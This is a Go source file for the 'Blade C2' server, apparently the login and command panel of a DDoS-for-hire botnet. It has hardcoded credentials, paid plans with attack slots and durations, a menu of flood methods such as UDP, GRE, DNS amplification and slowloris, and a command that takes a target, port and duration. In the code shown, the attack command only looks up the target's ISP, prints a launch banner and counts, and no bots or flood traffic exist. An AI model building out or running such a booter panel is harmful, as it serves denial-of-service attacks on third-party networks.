package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const PORT = 1337

var clients = make(map[net.Conn]string)
var activeAttacks = 0
var attackMutex sync.Mutex

// Colors
const (
	LIGHTBLUE = "\033[94m"
	LIGHTGRAY = "\033[37m"
	WHITE     = "\033[97m"
	RESET     = "\033[0m"
)

func getISP(ip string) string {
	url := fmt.Sprintf("http://ip-api.com/json/%s?fields=isp", ip)
	resp, err := http.Get(url)
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Unknown"
	}
	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "Unknown"
	}
	if isp, ok := result["isp"].(string); ok {
		return isp
	}
	return "Unknown"
}

func main() {
	listener, err := net.Listen("tcp", ":"+strconv.Itoa(PORT))
	if err != nil {
		fmt.Println("[-] Failed to start server:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Println("[+] Blade C2 started on port", PORT)
	fmt.Println("[+] Waiting for connections...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleClient(conn)
	}
}

func sendLine(conn net.Conn, text string) {
	conn.Write([]byte(text + "\r\n"))
}

func sendPrompt(conn net.Conn, text string) {
	conn.Write([]byte(text))
}

func updateTitle(conn net.Conn, username, plan string) {
	maxSlots := getMaxSlots(plan)
	attackMutex.Lock()
	current := activeAttacks
	attackMutex.Unlock()
	title := fmt.Sprintf("\033]0;%s | Slots: %d/%d | Welcome to Blade network\007", username, current, maxSlots)
	conn.Write([]byte(title))
}

func getMaxSlots(plan string) int {
	switch plan {
	case "VIP":
		return 10
	case "PREMIUM":
		return 5
	default:
		return 1
	}
}

func showWelcome(conn net.Conn, username string) {
	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%s{ + } Welcome %s, your now connected to the %sBlade servers%s.", LIGHTGRAY, username, LIGHTBLUE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%s{ + } Created by @ilarppp", LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%s{ + } Type help for commands", LIGHTGRAY))
	sendLine(conn, "")
}

func showHelp(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%shelp     %s- Show this menu", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sbots     %s- List connected bots", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sattacks  %s- Show active attacks", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%smethods  %s- List attack methods", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sscan     %s- Scan a network range", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sclear    %s- Clear screen", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%slogout   %s- Disconnect", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%splan     %s- Show your plan", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sowner    %s- Show owner info", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sstop     %s- Stop all your attacks", WHITE, LIGHTGRAY))
	sendLine(conn, "")
}

func showMethods(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%sudp       %s- UDP flood", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%stcp       %s- TCP flood", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sraw       %s- Raw socket flood", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sgre       %s- GRE/IPIP flood", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sdns       %s- DNS amplification", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%shex       %s- HEX flood", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%shold      %s- Connection hold", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%smix       %s- Mixed attack", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sslowloris %s- Slowloris attack", WHITE, LIGHTGRAY))
	sendLine(conn, "")
}

func showOwner(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%sGitHub: %sSet this part up", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%sDev: %silarppp", WHITE, LIGHTGRAY))
	sendLine(conn, "")
}

func showPlan(conn net.Conn, username string) {
	plan := getUserPlan(username)
	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%sPlan: %s%s", WHITE, LIGHTGRAY, plan))
	if plan == "VIP" {
		sendLine(conn, fmt.Sprintf("%s  Duration: 3600s", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Daily: Unlimited", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Methods: All", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Concurrent: 10", LIGHTGRAY))
	} else if plan == "PREMIUM" {
		sendLine(conn, fmt.Sprintf("%s  Duration: 1200s", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Daily: 500", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Methods: Most (no GRE/DNS)", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Concurrent: 5", LIGHTGRAY))
	} else {
		sendLine(conn, fmt.Sprintf("%s  Duration: 300s", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Daily: 50", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Methods: UDP/TCP/SYN only", LIGHTGRAY))
		sendLine(conn, fmt.Sprintf("%s  Concurrent: 1", LIGHTGRAY))
	}
	sendLine(conn, "")
}

func showBots(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%sConnected Bots: %s0", WHITE, LIGHTGRAY))
	sendLine(conn, fmt.Sprintf("%s  No bots connected.", LIGHTGRAY))
	sendLine(conn, "")
}

func showAttacks(conn net.Conn) {
	attackMutex.Lock()
	count := activeAttacks
	attackMutex.Unlock()

	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%sActive Attacks: %s%d", WHITE, LIGHTGRAY, count))
	if count == 0 {
		sendLine(conn, fmt.Sprintf("%s  No active attacks.", LIGHTGRAY))
	} else {
		// Show attack details would go here
	}
	sendLine(conn, "")
}

func startAttack(conn net.Conn, method, target, port, duration, username string) {
	isp := getISP(target)

	attackMutex.Lock()
	activeAttacks++
	attackMutex.Unlock()

	plan := getUserPlan(username)
	updateTitle(conn, username, plan)

	sendLine(conn, "")
	sendLine(conn, fmt.Sprintf("%s[Attack Launched]", LIGHTBLUE))
	sendLine(conn, fmt.Sprintf("%s Target:   %s%s", WHITE, LIGHTGRAY, target))
	sendLine(conn, fmt.Sprintf("%s Port:     %s%s", WHITE, LIGHTGRAY, port))
	sendLine(conn, fmt.Sprintf("%s Method:   %s%s", WHITE, LIGHTGRAY, method))
	sendLine(conn, fmt.Sprintf("%s Duration: %s%ss", WHITE, LIGHTGRAY, duration))
	sendLine(conn, fmt.Sprintf("%s Time sent [%s%s%s]", WHITE, LIGHTGRAY, time.Now().Format("15:04"), WHITE))
	sendLine(conn, fmt.Sprintf("%s ISP:      %s%s", WHITE, LIGHTGRAY, isp))
	sendLine(conn, "")

	// Auto decrement after duration
	go func() {
		dur, _ := strconv.Atoi(duration)
		time.Sleep(time.Duration(dur) * time.Second)
		attackMutex.Lock()
		if activeAttacks > 0 {
			activeAttacks--
		}
		attackMutex.Unlock()
		updateTitle(conn, username, plan)
	}()
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	sendPrompt(conn, fmt.Sprintf("%sUsername: %s", WHITE, LIGHTGRAY))
	username, _ := bufio.NewReader(conn).ReadString('\n')
	username = strings.TrimSpace(username)

	sendPrompt(conn, fmt.Sprintf("%sPassword: %s", WHITE, LIGHTGRAY))
	password, _ := bufio.NewReader(conn).ReadString('\n')
	password = strings.TrimSpace(password)

	if !authLogin(username, password) {
		sendLine(conn, "Invalid credentials!")
		return
	}

	plan := getUserPlan(username)
	clients[conn] = username
	defer delete(clients, conn)

	updateTitle(conn, username, plan)
	showWelcome(conn, username)

	for {
		sendPrompt(conn, fmt.Sprintf("%s[User]@blade>> %s", WHITE, LIGHTGRAY))
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(strings.ToLower(cmd))

		if cmd == "" {
			continue
		}

		parts := strings.Fields(cmd)

		switch parts[0] {
		case "help":
			showHelp(conn)
		case "bots":
			showBots(conn)
		case "attacks":
			showAttacks(conn)
		case "methods":
			showMethods(conn)
		case "plan":
			showPlan(conn, username)
		case "owner":
			showOwner(conn)
		case "clear":
			conn.Write([]byte("\033[2J\033[H"))
			showWelcome(conn, username)
		case "stop":
			attackMutex.Lock()
			activeAttacks = 0
			attackMutex.Unlock()
			updateTitle(conn, username, plan)
			sendLine(conn, fmt.Sprintf("%s[+] All attacks stopped.", LIGHTGRAY))
		case "logout", "exit":
			sendLine(conn, "Goodbye!")
			return
		default:
			if len(parts) == 4 {
				method := parts[0]
				target := parts[1]
				port := parts[2]
				duration := parts[3]
				startAttack(conn, method, target, port, duration, username)
			} else {
				sendLine(conn, fmt.Sprintf("%sUnknown command. Type 'help' for commands.", LIGHTGRAY))
			}
		}
	}
}

func authLogin(username, password string) bool {
	if username == "root" && password == "blade123" {
		return true
	}
	if username == "premium" && password == "premium123" {
		return true
	}
	if username == "user" && password == "user123" {
		return true
	}
	return false
}

func getUserPlan(username string) string {
	if username == "root" {
		return "VIP"
	}
	if username == "premium" {
		return "PREMIUM"
	}
	return "USER"
}